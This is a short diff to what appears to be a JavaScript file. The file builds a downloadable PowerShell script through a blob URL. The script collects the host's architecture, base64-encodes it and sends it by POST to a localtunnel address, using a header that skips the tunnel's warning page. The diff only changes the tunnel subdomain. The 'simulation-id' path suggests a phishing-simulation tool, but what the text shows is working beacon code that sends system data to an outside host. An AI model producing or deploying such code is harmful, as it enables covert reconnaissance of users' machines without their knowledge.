@@ -124,7 +124,7 @@ const fileContent = [
         "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; " +
         "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json); " +
         "$b64 = [Convert]::ToBase64String($bytes); " +
-        "Invoke-RestMethod -Uri 'https://tiny-moles-wink.loca.lt/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}\"",
+        "Invoke-RestMethod -Uri 'https://violet-comics-allow.loca.lt/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}\"",
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
